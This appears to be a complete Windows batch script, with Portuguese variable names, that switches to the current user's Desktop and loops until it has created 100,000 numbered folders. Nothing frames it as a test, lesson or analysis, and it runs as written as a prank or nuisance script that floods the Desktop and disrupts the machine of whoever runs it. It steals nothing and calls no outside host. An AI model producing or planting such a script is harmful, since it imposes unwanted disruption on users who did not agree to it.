@echo off
cls
@ECHO OFF
CD %userprofile%\Desktop
SET NumeroDePastas=100000
SET /a Nome=0
:3
IF EXIST %NumeroDePastas% GOTO 4
SET /a Nome=%Nome%+1
MD %Nome%
GOTO 3
:4
EXIT
